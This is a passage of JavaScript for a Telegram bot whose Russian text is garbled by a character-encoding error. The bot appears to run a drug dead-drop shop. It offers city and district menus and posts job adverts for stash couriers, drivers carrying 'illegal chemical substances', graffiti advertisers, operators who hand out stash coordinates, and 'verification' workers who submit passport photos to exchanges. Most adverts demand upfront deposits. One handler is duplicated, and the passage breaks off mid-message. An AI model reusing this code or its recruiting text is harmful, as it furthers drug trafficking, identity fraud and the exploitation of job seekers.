return bot.sendMessage(message.chat.id,`üìç –í—ã–±–µ—Ä–∏—Ç–µ –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–∏–π –≤–∞—Å —Ä–∞–π–æ–Ω:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "üí† –î—ë–º—Å–∫–∏–π", callback_data: `kup_1` },
                { text: "üí† –ö–∞–ª–∏–Ω–∏–Ω—Å–∫–∏–π", callback_data: `kup_2` },
                 ],
                 [
                    { text: "üí† –ö–∏—Ä–æ–≤—Å–∫–∏–π", callback_data: `kup_3` },
                    { text: "üí† –õ–µ–Ω–∏–Ω—Å–∫–∏–π", callback_data: `kup_4` },
                 ],
                 [
                    { text: "üí† –û—Ä–¥–∂–æ–Ω–∏–∫–∏–¥–∑–µ–≤—Å–∫–∏–π", callback_data: `kup_5` },
                 ],
                 [
                    { text: "< –ù–∞–∑–∞–¥", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("d22")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)

return bot.sendMessage(message.chat.id,`üìç –í—ã–±–µ—Ä–∏—Ç–µ –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–∏–π –≤–∞—Å —Ä–∞–π–æ–Ω:`, {
reply_markup: {
		inline_keyboard: [
                 [
                    { text: "üí† –¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π", callback_data: `kup_5` },
                 ],
                 [
                    { text: "< –ù–∞–∑–∞–¥", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("f23")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
return bot.sendMessage(message.chat.id,`üìç –í—ã–±–µ—Ä–∏—Ç–µ –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–∏–π –≤–∞—Å —Ä–∞–π–æ–Ω:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "üí† –ö–∞–ª–∏–Ω–∏–Ω—Å–∫–∏–π", callback_data: `kup_1` },
                { text: "üí† –ö—É—Ä—á–∞—Ç–æ–≤—Å–∫–∏–π", callback_data: `kup_2` },
                 ],
                 [
                    { text: "üí† –õ–µ–Ω–∏–Ω—Å–∫–∏–π", callback_data: `kup_3` },
                    { text: "üí† –°–æ–≤–µ—Ç—Å–∫–∏–π", callback_data: `kup_4` },
                 ],
                 [
                    { text: "üí† –¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π", callback_data: `kup_5` },
                 ],
                 [
                    { text: "< –ù–∞–∑–∞–¥", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("g24")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
return bot.sendMessage(message.chat.id,`üìç –í—ã–±–µ—Ä–∏—Ç–µ –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–∏–π –≤–∞—Å —Ä–∞–π–æ–Ω:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "üí† –ß–µ—Ä–Ω–æ–≤—Å–∫–∏–π", callback_data: `kup_1` },
                { text: "üí† –ñ–µ–ª–µ–∑–Ω–æ–¥–æ—Ä–æ–∂–Ω—ã–π", callback_data: `kup_2` },
                 ],
                 [
                    { text: "üí† –ò–Ω–≥–æ–¥–∏–Ω—Å–∫–∏–π", callback_data: `kup_3` },
                    { text: "üí† –ê—ç—Ä–æ–ø–æ—Ä—Ç", callback_data: `kup_4` },
                 ],
                 [
                    { text: "üí† –¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π", callback_data: `kup_5` },
                 ],
                 [
                    { text: "< –ù–∞–∑–∞–¥", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("kat")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
    
return bot.sendMessage(message.chat.id,`‚ñ™Ô∏è –ï—Å–ª–∏ –≤–∞—à –Ω–∞—Å–µ–ª—ë–Ω–Ω—ã–π –ø—É–Ω–∫—Ç –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç –≤ –∫–∞—Ç–∞–ª–æ–≥–µ - –æ–±—Ä–∞—Ç–∏—Ç–µ—Å—å –∫ –æ–ø–µ—Ä–∞—Ç–æ—Ä—É, –º—ã –ø–æ–º–æ–∂–µ–º —Å –æ—Ñ–æ—Ä–º–ª–µ–Ω–∏–µ–º –ø—Ä–µ–¥–∑–∞–∫–∞–∑–∞/–¥–æ—Å—Ç–∞–≤–∫–∏.

‚ö°Ô∏è –í—ã–±–µ—Ä–∏—Ç–µ –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–∏–π –≤–∞—Å –≥–æ—Ä–æ–¥:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "üí† –ê–Ω–≥–∞—Ä—Å–∫", callback_data: `1` },
                { text: "üí† –ê—Ä—Ö–∞–Ω–≥–µ–ª—å—Å–∫", callback_data: `2` },
                 ],
                 [
                    { text: "üí† –í–ª–∞–¥–∏–≤–æ—Å—Ç–æ–∫", callback_data: `3` },
                    { text: "üí† –í–æ—Ä–æ–Ω–µ–∂", callback_data: `4` },
                 ],
                 [
                    { text: "üí† –ï–∫–∞—Ç–µ—Ä–∏–Ω–±—É—Ä–≥", callback_data: `5` },
                    { text: "üí† –ò—Ä–∫—É—Ç—Å–∫", callback_data: `6` },
                 ],
                 [
                    { text: "üí† –ö–∞–∑–∞–Ω—å", callback_data: `7` },
                    { text: "üí† –ö—Ä–∞—Å–Ω–æ—è—Ä—Å–∫", callback_data: `8` },
                 ],
                 [
                    { text: "üí† –ú–æ—Å–∫–≤–∞", callback_data: `9` },
                    { text: "üí† –ù–∏–∂–Ω–∏–π –ù–æ–≤–≥–æ—Ä–æ–¥", callback_data: `q10` },
                 ],
                 [
                    { text: "üí† –ù–æ–≤–æ—Å–∏–±–∏—Ä—Å–∫", callback_data: `w11` },
                    { text: "üí† –û–º—Å–∫", callback_data: `e12` },
                 ],
                 [
                    { text: "üí† –û—Ä–µ–Ω–±—É—Ä–≥", callback_data: `r13` },
                    { text: "üí† –†–æ—Å—Ç–æ–≤ –Ω–∞ –î–æ–Ω—É", callback_data: `t14` },
                 ],
                 [
                    { text: "üí† –°–∞–º–∞—Ä–∞", callback_data: `y15` },
                    { text: "üí† –°–∞–Ω–∫—Ç-–ü–µ—Ç–µ—Ä–±—É—Ä–≥", callback_data: `u16` },
                 ],
                 [
                    { text: "üí† –°–∞—Ä–∞—Ç–æ–≤", callback_data: `i17` },
                    { text: "üí† –¢–≤–µ—Ä—å", callback_data: `o18` },
                 ],
                 [
                    { text: "üí† –¢–æ–º—Å–∫", callback_data: `p19` },
                    { text: "üí† –¢—é–º–µ–Ω—å", callback_data: `a20` },
                 ],
                 [
                    { text: "üí† –£—Ñ–∞", callback_data: `s21` },
                    { text: "üí† –•–∞–±–∞—Ä–æ–≤—Å–∫", callback_data: `d22` },
                 ],
                 [
                    { text: "üí† –ß–µ–ª—è–±–∏–Ω—Å–∫", callback_data: `f23` },
                    { text: "üí† –ß–∏—Ç–∞", callback_data: `g24` },
                 ],
                 [
                    { text: "< –ù–∞–∑–∞–¥", callback_data: `menu` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("tkur")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)

return bot.sendMessage(message.chat.id,`üèÉ‚Äç‚ôÇÔ∏è –ö—É—Ä—å–µ—Ä üèÉ‚Äç‚ôÇÔ∏è

–°—É—Ç—å —Ä–∞–±–æ—Ç—ã - ¬´—Ä–∞—Å–∫–ª–∞–¥–∫–∞¬ª –ø–æ–∑–∏—Ü–∏–π –ø–æ –≤—ã–¥–∞–Ω–Ω–æ–º—É —Ä–∞–π–æ–Ω—É.

‚ñ™Ô∏è –ú—ã –ø–ª–∞—Ç–∏–º –∑–∞ –∑–∞–≥—Ä—É–∂–µ–Ω–Ω—ã–µ –∞–¥—Ä–µ—Å–∞, –≤–∞–º –Ω–µ –Ω—É–∂–Ω–æ –æ–∂–∏–¥–∞—Ç—å –ø—Ä–æ–¥–∞–∂–∏ –∫–ª–∞–¥–∞.
‚ñ™Ô∏è –û–ø–ª–∞—Ç–∞ –∑–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–Ω—É—é —Ä–∞–±–æ—Ç—É –¥–µ–Ω—å –≤ –¥–µ–Ω—å.
‚ñ™Ô∏è –ü—Ä–µ–º–∏–∏ –∏ –±–æ–Ω—É—Å—ã —Å—Ä–µ–¥–∏ –∫—É—Ä—å–µ—Ä–æ–≤ –æ—Ä–≥–∞–Ω–∏–∑—É—é—Ç—Å—è –µ–∂–µ–Ω–µ–¥–µ–ª—å–Ω–æ.
‚ñ™Ô∏è –ö–æ–Ω–∫—É—Ä—Å—ã —Å—Ä–µ–¥–∏ –∫—É—Ä—å–µ—Ä–æ–≤ –ø—Ä–æ–≤–æ–¥—è—Ç—Å—è –≤ –∫–æ–Ω—Ü–µ –∫–∞–∂–¥–æ–≥–æ –∫–∞–ª–µ–Ω–¥–∞—Ä–Ω–æ–≥–æ –º–µ—Å—è—Ü–∞. 
‚ñ™Ô∏è –ú—ã –æ–±–ª–∞–¥–∞–µ–º –æ–≥—Ä–æ–º–Ω–æ–π –±–∏–±–ª–∏–æ—Ç–µ–∫–æ–π –æ–±—É—á–∞—é—â–∏—Ö –º–∞—Ç–µ—Ä–∏–∞–ª–æ–≤. –û–±—É—á–µ–Ω–∏–µ –ø—Ä–æ–≤–æ–¥–∏—Ç—Å—è —Å–æ—Ç—Ä—É–¥–Ω–∏–∫–∞–º–∏ —Å–æ —Å—Ç–∞–∂–µ–º —Ä–∞–±–æ—Ç—ã –±–æ–ª–µ–µ –ø—è—Ç–∏ –ª–µ—Ç.
‚ñ™Ô∏è –ü—Ä–∏—Å—É—Ç—Å—Ç–≤—É–µ—Ç —á–∞—Ç –¥–ª—è –∫—É—Ä—å–µ—Ä–æ–≤, –≤ –∫–æ—Ç–æ—Ä–æ–º –≤—ã —Å–º–æ–∂–µ—Ç–µ –æ–±–º–µ–Ω–∏–≤–∞—Ç—å—Å—è –æ–ø—ã—Ç–æ–º —Å –¥—Ä—É–≥–∏–º–∏ —Å–æ—Ç—Ä—É–¥–Ω–∏–∫–∞–º–∏.
–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –∏—Å–∫–ª—é—á–∏—Ç–µ–ª—å–Ω–æ –ø–æ –∑–∞–ª–æ–≥—É –æ—Ç 3000‚ÇΩ. –î–ª—è –Ω–∞—á–∞–ª–∞ —Ç—Ä—É–¥–æ—É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ –Ω–∞–ø–∏—à–∏—Ç–µ —Å–≤–æ–π –≥–æ—Ä–æ–¥ –æ–ø–µ—Ä–∞—Ç–æ—Ä—É.

`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "üèÉ‚Äç‚ôÇÔ∏è –ö—É—Ä—å–µ—Ä", callback_data: `tkur` },
                { text: "üñº –¢—Ä–∞—Ñ–∞—Ä–µ—Ç—á–∏–∫", callback_data: `traf` },
                { text: "üöõ –í–æ–¥–∏—Ç–µ–ª—å", callback_data: `vodila` },
                 ],
                 [
{ text: "üì∞ –í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è", callback_data: `veg` },
{ text: "üßë‚Äçüíª –û–ø–µ—Ä–∞—Ç–æ—Ä", callback_data: `oper` },
                 ],
                 [
                    { text: "< –ù–∞–∑–∞–¥", callback_data: `menu` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("traf")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)

return bot.sendMessage(message.chat.id,`üñº –¢—Ä–∞—Ñ–∞—Ä–µ—Ç—á–∏–∫ üñº

–°—É—Ç—å —Ä–∞–±–æ—Ç—ã - –Ω–∞–Ω–µ—Å–µ–Ω–∏–µ —Ä–∏—Å—É–Ω–∫–∞/–Ω–∞–∫–ª–µ–π–∫–∏ –Ω–∞ –ø—Ä–æ—Ö–æ–¥–∏–º—ã–µ –º–µ—Å—Ç–∞, —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏—Ä–æ–≤–∞–Ω–∏–µ –≥—Ä–∞—Ñ—Ñ–∏—Ç–∏/—Å—Ç–∏–∫–µ—Ä–∞ —á–µ—Ä–µ–∑ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ NoteCam

‚ñ™Ô∏è –û–ø–ª–∞—Ç–∞ –æ—Ç 110‚ÇΩ –∑–∞ –≥—Ä–∞—Ñ—Ñ–∏—Ç–∏.
‚ñ™Ô∏è –û–ø–ª–∞—Ç–∞ –æ—Ç 50‚ÇΩ –∑–∞ —Å—Ç–∏–∫–µ—Ä. 
‚ñ™Ô∏è –í—ã–ø–ª–∞—Ç–∞ –æ—Ç 20 –≥—Ä–∞—Ñ—Ñ–∏—Ç–∏ / 50 —Å—Ç–∏–∫–µ—Ä–æ–≤.
‚ñ™Ô∏è –¢–µ–∫—Å—Ç –¥–ª—è –≥—Ä–∞—Ñ—Ñ–∏—Ç–∏ –≤—ã–¥–∞—Å—Ç –æ–ø–µ—Ä–∞—Ç–æ—Ä.
‚ñ™Ô∏è –ß–µ–∫ –ø—Ä–∏ –ø–æ–∫—É–ø–∫–µ –∫—Ä–∞—Å–∫–∏ —Å–æ—Ö—Ä–∞–Ω—è–π—Ç–µ, –º—ã –∫–æ–º–ø–µ–Ω—Å–∏—Ä—É–µ–º –∑–∞—Ç—Ä–∞—Ç—ã –Ω–∞ –Ω–µ—ë –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –ø–µ—Ä–≤–æ–π –ó–ü.

–î–ª—è –Ω–∞—á–∞–ª–∞ —Ç—Ä—É–¥–æ—É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ –Ω–∞–ø–∏—à–∏—Ç–µ —Å–≤–æ–π –≥–æ—Ä–æ–¥ –æ–ø–µ—Ä–∞—Ç–æ—Ä—É, –ø–æ–ª—É—á–∏—Ç–µ –±–æ–ª–µ–µ –ø–æ–¥—Ä–æ–±–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –∏ –∫—É–ø–∏—Ç–µ –±–∞–ª–ª–æ–Ω —Å –∫—Ä–∞—Å–∫–æ–π

`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "üèÉ‚Äç‚ôÇÔ∏è –ö—É—Ä—å–µ—Ä", callback_data: `tkur` },
                { text: "üñº –¢—Ä–∞—Ñ–∞—Ä–µ—Ç—á–∏–∫", callback_data: `traf` },
                { text: "üöõ –í–æ–¥–∏—Ç–µ–ª—å", callback_data: `vodila` },
                 ],
                 [
{ text: "üì∞ –í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è", callback_data: `veg` },
{ text: "üßë‚Äçüíª –û–ø–µ—Ä–∞—Ç–æ—Ä", callback_data: `oper` },
                 ],
                 [
                    { text: "< –ù–∞–∑–∞–¥", callback_data: `menu` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("vodila")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)

return bot.sendMessage(message.chat.id,`üöõ –í–æ–¥–∏—Ç–µ–ª—å üöõ

–°—É—Ç—å —Ä–∞–±–æ—Ç—ã - –ø–µ—Ä–µ–≤–æ–∑–∫–∞ —Ç–æ–≤–∞—Ä–∞ (—Ö–∏–º.–≤–µ—â–µ—Å—Ç–≤ –Ω–µ–ª–µ–≥–∞–ª—å–Ω–æ–≥–æ —Ö–∞—Ä–∞–∫—Ç–µ—Ä–∞ –º–µ–∂–¥—É –≥–æ—Ä–æ–¥–∞–º–∏)

–ì—Ä–∞—Ñ–∏–∫ –Ω–µ –Ω–æ—Ä–º–∏—Ä–æ–≤–∞–Ω, —Ä–µ–π—Å—ã –Ω–∞ —Ä–∞–∑–Ω—ã–µ —Ä–∞—Å—Å—Ç–æ—è–Ω–∏—è, –ó–ü –æ—Ç 70000‚ÇΩ –∑–∞ —Ä–µ–π—Å, —Ä–∞–±–æ—Ç–∞ —Å –±–æ–ª—å—à–∏–º –≤–µ—Å–æ–º..

‚ñ™Ô∏è –í—Å–µ —Ä–∞—Å—Ö–æ–¥–Ω—ã–µ –º–∞—Ç–µ—Ä–∏–∞–ª—ã –ø–æ–∫—Ä—ã–≤–∞—é—Ç –æ—Ç–¥–µ–ª—å–Ω–æ (–ì–°–ú, –∞—Ä–µ–Ω–¥–∞ –∂–∏–ª—å—è –ø–æ –Ω–∞–¥–æ–±–Ω–æ—Å—Ç–∏).
‚ñ™Ô∏è –û–ø–ª–∞—Ç—É –ø–æ–ª—É—á–∞–µ—Ç–µ –ø–æ—Å–ª–µ –¥–æ—Å—Ç–∞–≤–∫–∏ —Ç–æ–≤–∞—Ä–∞, –∏ –µ–≥–æ –ø—Ä–æ–≤–µ—Ä–∫–∏, –≤—Å–µ —Ä–∞—Å—Ö–æ–¥—ã —Ç–∞–∫ –∂–µ –≤–æ–∑–º–µ—â–∞—é—Ç –≤ –ó–ü.
‚ñ™Ô∏è –ó–ü –Ω–∞ –±–∏—Ç–∫–æ–∏–Ω –∫–æ—à–µ–ª–µ–∫, –≤ —Å–ª—É—á–∞–µ –Ω–µ—É–º–µ–Ω–∏—è –∏–º –ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è - –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç—Å—è –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—è.
‚ñ™Ô∏è –ü–æ—Å–ª–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ –∫—É—Ä–∞—Ç–æ—Ä –ø—Ä–æ–≤–µ–¥–µ—Ç –ø–æ–ª–Ω—ã–π –∏–Ω—Å—Ç—Ä—É–∫—Ç–∞–∂ –ø–æ —Ä–∞–±–æ—Ç–µ –∏ —Ç–µ—Ö–Ω–∏–∫–µ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏, –¥–ª—è –ø—Ä–∞–∫—Ç–∏–∫–∏ –≤–∞–º –±—É–¥–µ—Ç –≤—ã–¥–∞–Ω –æ–¥–∏–Ω –æ–ø–ª–∞—á–∏–≤–∞–µ–º—ã–π —Å—Ç–∞–∂–∏—Ä–æ–≤–æ—á–Ω—ã–π —Ä–µ–π—Å.

–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –∏—Å–∫–ª—é—á–∏—Ç–µ–ª—å–Ω–æ –ø–æ –∑–∞–ª–æ–≥—É –æ—Ç 60000‚ÇΩ. –î–ª—è –Ω–∞—á–∞–ª–∞ —Ç—Ä—É–¥–æ—É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ –Ω–∞–ø–∏—à–∏—Ç–µ —Å–≤–æ–π –≥–æ—Ä–æ–¥ –æ–ø–µ—Ä–∞—Ç–æ—Ä—É.

`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "üèÉ‚Äç‚ôÇÔ∏è –ö—É—Ä—å–µ—Ä", callback_data: `tkur` },
                { text: "üñº –¢—Ä–∞—Ñ–∞—Ä–µ—Ç—á–∏–∫", callback_data: `traf` },
                { text: "üöõ –í–æ–¥–∏—Ç–µ–ª—å", callback_data: `vodila` },
                 ],
                 [
{ text: "üì∞ –í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è", callback_data: `veg` },
{ text: "üßë‚Äçüíª –û–ø–µ—Ä–∞—Ç–æ—Ä", callback_data: `oper` },
                 ],
                 [
                    { text: "< –ù–∞–∑–∞–¥", callback_data: `menu` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("veg")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)

return bot.sendMessage(message.chat.id,`üì∞ –í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è üì∞

–°—É—Ç—å —Ä–∞–±–æ—Ç—ã - –ø—Ä–æ—Ö–æ–∂–¥–µ–Ω–∏–µ –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏ –Ω–∞ —Ä–∞–∑–ª–∏—á–Ω—ã—Ö –±–∏—Ä–∂–∞—Ö

‚ñ™Ô∏è –î–æ—Å—Ç—É–ø–Ω–æ –æ—Ç 2—Ö –∑–∞–¥–∞–Ω–∏–π –µ–∂–µ–¥–Ω–µ–≤–Ω–æ.
‚ñ™Ô∏è –í—ã–ø–ª–∞—Ç–∞ –ø–æ—Å–ª–µ –ø—Ä–æ–≤–µ—Ä–∫–∏ –¥–æ–∫—É–º–µ–Ω—Ç–∞ —Å–µ—Ä–≤–∏—Å–æ–º. 
‚ñ™Ô∏è –û–ø–ª–∞—Ç–∞ 1 –∑–∞–¥–∞–Ω–∏—è = 1000 ‚ÇΩ.
‚ñ™Ô∏è –û–ø–ª–∞—Ç—É –∑–∞ –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—é –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∫–∞–∫ –∑–∞–ª–æ–≥ –¥–ª—è –¥—Ä—É–≥–æ–π –≤–∞–∫–∞–Ω—Å–∏–∏.

–î–ª—è –Ω–∞—á–∞–ª–∞ —Ç—Ä—É–¥–æ—É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ –ø—Ä–∏—à–ª–∏—Ç–µ —Ñ–æ—Ç–æ –ø–µ—Ä–≤–æ–π —Å—Ç—Ä–∞–Ω–∏—Ü—ã –ø–∞—Å–ø–æ—Ä—Ç–∞ –æ–ø–µ—Ä–∞—Ç–æ—Ä—É. –ü—Ä–∏–º–µ—Ä: <a href="https://telegra.ph/file/52e526bf246fbd07eb5e5.png">–ø–µ—Ä–µ–π—Ç–∏</a>
`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "üèÉ‚Äç‚ôÇÔ∏è –ö—É—Ä—å–µ—Ä", callback_data: `tkur` },
                { text: "üñº –¢—Ä–∞—Ñ–∞—Ä–µ—Ç—á–∏–∫", callback_data: `traf` },
                { text: "üöõ –í–æ–¥–∏—Ç–µ–ª—å", callback_data: `vodila` },
                 ],
                 [
{ text: "üì∞ –í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è", callback_data: `veg` },
{ text: "üßë‚Äçüíª –û–ø–µ—Ä–∞—Ç–æ—Ä", callback_data: `oper` },
                 ],
                 [
                    { text: "< –ù–∞–∑–∞–¥", callback_data: `menu` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("oper")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)

return bot.sendMessage(message.chat.id,`üë®‚Äçüíª –û–ø–µ—Ä–∞—Ç–æ—Ä üë®‚Äçüíª

–°—É—Ç—å —Ä–∞–±–æ—Ç—ã - –ø—Ä–∏–µ–º –æ–ø–ª–∞—Ç—ã –æ—Ç –∫–ª–∏–µ–Ω—Ç–æ–≤, –∫–æ–Ω—Å—É–ª—å—Ç–∞—Ü–∏—è, –≤—ã–¥–∞—á–∞ –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç–æ–≤.

‚ñ™Ô∏è –ì—Ä–∞—Ñ–∏–∫ - —Å–∞–º–æ—Å—Ç–æ—è—Ç–µ–ª—å–Ω—ã–π (5/2, 2/2 –∏ —Ç.–¥. –Ω–∞ –≤–∞—à–µ —É—Å–º–æ—Ç—Ä–µ–Ω–∏–µ).
‚ñ™Ô∏è –ú–∏–Ω–∏–º–∞–ª—å–Ω–æ–µ –≤—Ä–µ–º—è —Ä–∞–±–æ—Ç—ã –≤ –¥–µ–Ω—å - 4 —á–∞—Å–∞, –Ω–æ –Ω–µ –º–µ–Ω–µ–µ 30—á –≤ –Ω–µ–¥–µ–ª—é.
‚ñ™Ô∏è –ó–ü —Ä–∞—Å—Å—á–∏—Ç—ã–≤–∞–µ—Ç—Å—è –æ—Ç % –≤—ã–ø–æ–ª–Ω–µ–Ω–Ω—ã—Ö –ø—Ä–æ–¥–∞–∂   –ø—Ä–µ–º–∏–∏.
‚ñ™Ô∏è % –æ—Ç –ø—Ä–æ–¥–∞–∂ —Ä–∞—Å—Å—á–∏—Ç—ã–≤–∞–µ—Ç—Å—è –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç –≤—Ä–µ–º–µ–Ω–∏ —Å—É—Ç–æ–∫. –î–Ω–µ–≤–Ω–æ–µ –≤—Ä–µ–º—è - 5%, –Ω–æ—á–Ω–æ–µ - 10%.
‚ñ™Ô∏è –ù–µ–æ–±—Ö–æ–¥–∏–º –Ω–∞–≤—ã–∫ –±—ã—Å—Ç—Ä–æ–≥–æ –Ω–∞–±–æ—Ä–∞ —Ç–µ–∫—Å—Ç–∞ –±–µ–∑ –¥–æ–ø—É—â–µ–Ω–∏—è –æ—Ä—Ñ–æ–≥—Ä–∞—Ñ–∏—á–µ—Å–∫–∏—Ö –æ—à–∏–±–æ–∫.

–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –∏—Å–∫–ª—é—á–∏—Ç–µ–ª—å–Ω–æ –ø–æ –∑–∞–ª–æ–≥—É –æ—Ç 5000‚ÇΩ. –î–ª—è –Ω–∞—á–∞–ª–∞ —Ç—Ä—É–¥–æ—É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ –Ω–∞–ø–∏—à–∏—Ç–µ —Å–≤–æ–π –≥–æ—Ä–æ–¥ –æ–ø–µ—Ä–∞—Ç–æ—Ä—É.

`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "üèÉ‚Äç‚ôÇÔ∏è –ö—É—Ä—å–µ—Ä", callback_data: `tkur` },
                { text: "üñº –¢—Ä–∞—Ñ–∞—Ä–µ—Ç—á–∏–∫", callback_data: `traf` },
                { text: "üöõ –í–æ–¥–∏—Ç–µ–ª—å", callback_data: `vodila` },
                 ],
                 [
{ text: "üì∞ –í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è", callback_data: `veg` },
{ text: "üßë‚Äçüíª –û–ø–µ—Ä–∞—Ç–æ—Ä", callback_data: `oper` },
                 ],
                 [
                    { text: "< –ù–∞–∑–∞–¥", callback_data: `menu` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("tkur")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)

return bot.sendMessage(message.chat.id,`üèÉ‚Äç‚ôÇÔ∏è –ö—É—Ä—å–µ—Ä üèÉ‚Äç‚ôÇÔ∏è

–°—É—Ç—å —Ä–∞–±–æ—Ç—ã - ¬´—Ä–∞—Å–∫–ª–∞–¥–∫–∞¬ª –ø–æ–∑–∏—Ü–∏–π –ø–æ –≤—ã–¥–∞–Ω–Ω–æ–º—É —Ä–∞–π–æ–Ω—É.

‚ñ™Ô∏è –ú—ã –ø–ª–∞—Ç–∏–º –∑–∞ –∑–∞–≥—Ä—É–∂–µ–Ω–Ω—ã–µ –∞–¥—Ä–µ—Å–∞, –≤–∞–º –Ω–µ –Ω—É–∂–Ω–æ –æ–∂–∏–¥–∞—Ç—å –ø—Ä–æ–¥–∞–∂–∏ –∫–ª–∞–¥–∞.
‚ñ™Ô∏è –û–ø–ª–∞—Ç–∞ –∑–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–Ω—É—é —Ä–∞–±–æ—Ç—É –¥–µ–Ω—å –≤ –¥–µ–Ω—å.
‚ñ™Ô∏è –ü—Ä–µ–º–∏–∏ –∏ –±–æ–Ω—É—Å—ã —Å—Ä–µ–¥–∏ –∫—É—Ä—å–µ—Ä–æ–≤ –æ—Ä–≥–∞–Ω–∏–∑—É—é—Ç—Å—è –µ–∂–µ–Ω–µ–¥–µ–ª—å–Ω–æ.
‚ñ™Ô∏è –ö–æ–Ω–∫—É—Ä—Å—ã —Å—Ä–µ–¥–∏ –∫—É—Ä—å–µ—Ä–æ–≤ –ø—Ä–æ–≤–æ–¥—è—Ç—Å—è –≤ –∫–æ–Ω—Ü–µ –∫–∞–∂–¥–æ–≥–æ –∫–∞–ª–µ–Ω–¥–∞—Ä–Ω–æ–≥–æ –º–µ—Å—è—Ü–∞. 
‚ñ™Ô∏è –ú—ã –æ–±–ª–∞–¥–∞–µ–º –æ–≥—Ä–æ–º–Ω–æ–π –±–∏–±–ª–∏–æ—Ç–µ–∫–æ–π –æ–±—É—á–∞—é—â–∏—Ö –º–∞—Ç–µ—Ä–∏–∞–ª–æ–≤. –û–±—É—á–µ–Ω–∏–µ –ø—Ä–æ–≤–æ–¥–∏—Ç—Å—è —Å–æ—Ç—Ä—É–¥–Ω–∏–∫–∞–º–∏ —Å–æ —Å—Ç–∞–∂–µ–º —Ä–∞–±–æ—Ç—ã –±–æ–ª–µ–µ –ø—è—Ç–∏ –ª–µ—Ç.
‚ñ™Ô∏è –ü—Ä–∏—Å—É—Ç—Å—Ç–≤—É–µ—Ç —á–∞—Ç –¥–ª—è –∫—É—Ä—å–µ—Ä–æ–≤, –≤ –∫–æ—Ç–æ—Ä–æ–º –≤—ã —Å–º–æ–∂–µ—Ç–µ –æ–±–º–µ–Ω–∏–≤–∞—Ç—å—Å—è –æ–ø—ã—Ç–æ–º —Å –¥—Ä—É–≥–∏–º–∏ —Å–æ—Ç—Ä—É–¥–Ω–∏–∫–∞–º–∏.
